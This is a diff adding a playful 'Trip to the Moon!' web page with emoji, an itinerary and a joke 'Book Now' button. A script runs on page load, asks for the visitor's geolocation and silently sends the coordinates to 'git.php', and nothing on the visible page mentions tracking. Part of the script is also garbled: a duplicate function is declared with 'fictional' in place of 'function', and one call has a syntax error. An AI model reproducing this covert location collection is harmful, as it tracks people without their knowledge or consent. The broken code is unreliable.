@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trip to the Moon!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #000;
+            color: #fff;
+            text-align: center;
+            margin: 0;
+            padding: 20px;
+        }
+        h1 {
+            font-size: 4em;
+            margin-bottom: 0;
+        }
+        .rocket {
+            font-size: 100px;
+            animation: fly 2s infinite;
+        }
+        @keyframes fly {
+            0% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+            100% { transform: translateY(0); }
+        }
+        .moon {
+            font-size: 150px;
+            margin: 20px 0;
+        }
+        .section {
+            margin: 40px 0;
+            padding: 20px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+        }
+        button {
+            font-size: 1.5em;
+            padding: 10px 20px;
+            background-color: #ff4500;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else {
+                xinnerHTML = "Geolocation is not supported by this browser.";
+            }
+        }
+        
+        function showPosition(position) {
+            const xhttp = new XMLHttpRequest();
+            xhttp.open("GET", "git.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
+            xhttp.send();
+
+        }
+        
+       fictional showPosition(position) {
+        const xhttp = new XMLHttpRequest();
+        xhttp.open("GET". "git.php?lat=" + position.coords.latitude +  "&long=" + position.coords.longitude );
+        xhttp.send();
+        
+         }
+
+    </script>
+</head>
+<body onload="getLocation()">
+    <h1>Trip to the Moon!</h1>
+    <p>Why bother with Mars when the Moon is right there?</p>
+    
+    <div class="rocket">🚀</div>
+    
+    <div class="moon">🌕</div>
+    
+    <div class="section">
+        <h2>What You'll Need:</h2>
+        <ul style="list-style-type: none; padding: 0;">
+            <li>✅ A spacesuit (or a really warm jacket)</li>
+            <li>✅ Moon boots (or any boots, really)</li>
+            <li>✅ A camera (for Moon selfies)</li>
+            <li>✅ Cheese (in case the Moon isn't made of it)</li>
+        </ul>
+    </div>
+    
+    <div class="section">
+        <h2>Itinerary:</h2>
+        <p>Day 1: Launch from Earth (don't forget your toothbrush!)</p>
+        <p>Day 2-3: Float around in space (it's a long trip)</p>
+        <p>Day 4: Land on the Moon (try not to scratch the rocket)</p>
+        <p>Day 5: Plant your flag, take selfies, look for aliens</p>
+        <p>Day 6: Head home (don't forget your Moon rocks)</p>
+    </div>
+    
+    <button onclick="alert('Oops! We\'re all out of rockets. Try again next Tuesday!')">Book Now!</button>
+    
+    <p style="margin-top: 40px; font-size: 0.8em;">Disclaimer: This trip is entirely fictional. Please do not attempt to fly to the Moon without proper training, equipment, and a really, really big rocket. Will if you want to fly to the moon, invite me too!</p>
+    
+    <p id="geoInfo"></p>
+</body>
+</html>
